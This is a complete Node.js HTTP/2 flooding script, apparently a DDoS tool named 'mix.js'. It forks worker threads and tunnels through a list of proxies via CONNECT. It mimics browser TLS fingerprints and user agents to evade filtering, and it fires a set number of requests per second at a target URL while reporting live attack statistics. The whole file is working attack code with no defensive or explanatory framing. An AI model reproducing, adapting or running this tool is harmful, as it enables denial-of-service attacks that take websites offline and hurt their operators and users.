const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

if (process.argv.length < 5) {
  console.log("[!] node mix.js <URL> <TIME> <RPS> <THREADS>");
  process.exit();
}

function readLines(p) {
  try { return fs.readFileSync(p, "utf-8").toString().split(/\r?\n/).filter(Boolean); }
  catch(e) { console.error("[!] Cannot read " + p); return []; }
}
function randomIntn(min, max) { return Math.floor(Math.random() * (max - min) + min); }
function randomElement(arr) { return arr[randomIntn(0, arr.length)]; }
function randstr(len) { const c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"; let r = ""; for (let i=0;i<len;i++) r += c.charAt(Math.floor(Math.random()*c.length)); return r; }

const args = { target: process.argv[2], time: ~~process.argv[3], Rate: ~~process.argv[4], threads: ~~process.argv[5] };
const parsedTarget = url.parse(args.target);
const TARGET_PORT = parsedTarget.port || (parsedTarget.protocol === 'https:' ? 443 : 80);
const TARGET_HOST = parsedTarget.hostname;

// ========== LIVE STATS ==========
let __stats = { requests: 0, errors: 0, proxiesUsed: 0, proxiesFailed: 0, startTime: Date.now() };
setInterval(() => {
  const elapsed = Math.floor((Date.now() - __stats.startTime) / 1000);
  process.stdout.write('STATS:' + JSON.stringify({
    req: __stats.requests,
    err: __stats.errors,
    proxOK: __stats.proxiesUsed,
    proxFail: __stats.proxiesFailed,
    time: elapsed
  }) + '\n');
}, 5000);

const proxies = readLines("proxy.txt");
const userAgents = readLines("ua.txt");

if (proxies.length === 0 || userAgents.length === 0) {
  console.error("[!] proxy.txt or ua.txt empty");
  process.exit(1);
}

if (cluster.isMaster) {
  console.log("[+] Target: " + TARGET_HOST + ":" + TARGET_PORT);
  console.log("[+] Time: " + args.time + "s | Rate: " + args.Rate + " | Threads: " + args.threads);
  for (let i = 1; i <= args.threads; i++) cluster.fork();
  setTimeout(() => process.exit(1), args.time * 1000);
} else {
  setInterval(runFlooder, 1);
}

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [defaultCiphers[2], defaultCiphers[1], defaultCiphers[0], ...defaultCiphers.slice(3)].join(":");
const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.ALPN_ENABLED | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE | crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT | crypto.constants.SSL_OP_COOKIE_EXCHANGE | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
const secureContext = tls.createSecureContext({ ciphers, sigalgs, honorCipherOrder: true, secureOptions, secureProtocol: "TLS_client_method" });

const headers = {};
headers[":method"] = "GET";
headers[":path"] = parsedTarget.path || "/";
headers[":scheme"] = "https";
headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
headers["accept-language"] = "en-US,en;q=0.9";
headers["accept-encoding"] = "gzip, deflate, br";
headers["cache-control"] = "no-cache";
headers["upgrade-insecure-requests"] = "1";
headers["x-requested-with"] = "XMLHttpRequest";

class NetSocket {
  HTTP(options, callback) {
    const payload = "CONNECT " + options.address + " HTTP/1.1\r\nHost: " + options.address + "\r\nConnection: Keep-Alive\r\n\r\n";
    const buffer = Buffer.from(payload);
    const connection = net.connect({ host: options.host, port: options.port, allowHalfOpen: true });
    connection.setTimeout(10000);
    connection.setKeepAlive(true, 100000);
    connection.setNoDelay(true);
    connection.on("connect", () => connection.write(buffer));
    connection.on("data", chunk => {
      const resp = chunk.toString("utf-8");
      if (!resp.includes("HTTP/1.1 200")) { connection.destroy(); return callback(undefined, "error"); }
      return callback(connection, undefined);
    });
    connection.on("timeout", () => { connection.destroy(); return callback(undefined, "timeout"); });
    connection.on("error", () => { connection.destroy(); return callback(undefined, "error"); });
  }
}
const Socker = new NetSocket();

function runFlooder() {
  const proxyAddr = randomElement(proxies);
  const parsedProxy = proxyAddr.split(":");
  if (!parsedProxy[0] || !parsedProxy[1]) return;

  headers[":authority"] = TARGET_HOST + ":" + TARGET_PORT;
  headers["user-agent"] = randomElement(userAgents);
  headers["referer"] = "https://" + TARGET_HOST + "/?" + randstr(15);

  const proxyOptions = { host: parsedProxy[0], port: ~~parsedProxy[1], address: TARGET_HOST + ":" + TARGET_PORT, timeout: 100 };

  Socker.HTTP(proxyOptions, (connection, error) => {
    if (error) { __stats.proxiesFailed++; return; }
    __stats.proxiesUsed++;
    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true);

    const tlsOptions = {
      port: TARGET_PORT, secure: true, ciphers, sigalgs, ecdhCurve,
      requestCert: true, socket: connection, host: TARGET_HOST,
      rejectUnauthorized: false, servername: TARGET_HOST,
      secureContext, ALPNProtocols: ['h2', 'http/1.1'], honorCipherOrder: true
    };

    const tlsConn = tls.connect(TARGET_PORT, TARGET_HOST, tlsOptions);
    tlsConn.allowHalfOpen = true;
    tlsConn.setNoDelay(true);
    tlsConn.setKeepAlive(true, 60000);
    tlsConn.setMaxListeners(0);

    const h2Url = "https://" + TARGET_HOST + ":" + TARGET_PORT;
    const client = http2.connect(h2Url, {
      protocol: "https:",
      settings: { enablePush: false, initialWindowSize: 1073741823 },
      maxSessionMemory: 655000,
      createConnection: () => tlsConn
    });

    client.setMaxListeners(0);
    client.settings({ headerTableSize: 65536, maxConcurrentStreams: 2000, initialWindowSize: 6291456, maxHeaderListSize: 65536, enablePush: false });

    client.on("connect", () => {
      const IntervalAttack = setInterval(() => {
        for (let i = 0; i < args.Rate; i++) {
          const request = (__stats.requests++, client.request(headers)).on("response", () => { request.close(); request.destroy(); });
          request.end();
        }
      }, 1000);
      client.on("close", () => { clearInterval(IntervalAttack); client.destroy(); connection.destroy(); });
    });
    client.on("error", () => { __stats.errors++; client.destroy(); connection.destroy(); });
    client.on("close", () => { client.destroy(); connection.destroy(); });
  });
}
setTimeout(() => process.exit(1), args.time * 1000);
